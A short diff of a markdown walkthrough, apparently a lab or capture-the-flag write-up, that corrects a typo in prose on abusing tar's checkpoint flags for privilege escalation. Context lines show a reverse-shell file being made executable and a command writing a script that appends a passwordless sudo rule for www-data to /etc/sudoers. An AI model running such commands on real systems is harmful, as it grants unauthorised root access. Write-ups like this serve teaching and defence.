@@ -132,7 +132,7 @@ chmod +x /tmp/revshell
             Run ACTION on each checkpoint.
 ````
 
-<p align="justify">Here, the previous tar flags mentioned before revealed useful insofar as their permitted to define a script to run with tar. The following commands could have been run to execute the attack and get an foothold in sudoers users : </p>
+<p align="justify">Here, the previous tar flags mentioned before revealed useful insofar as their permitted to define a script to run with tar. The following commands could have been run to execute the attack and get a foothold in sudoers users : </p>
 
 ````bash
 echo "echo 'www-data  ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > /home/user/evil.sh
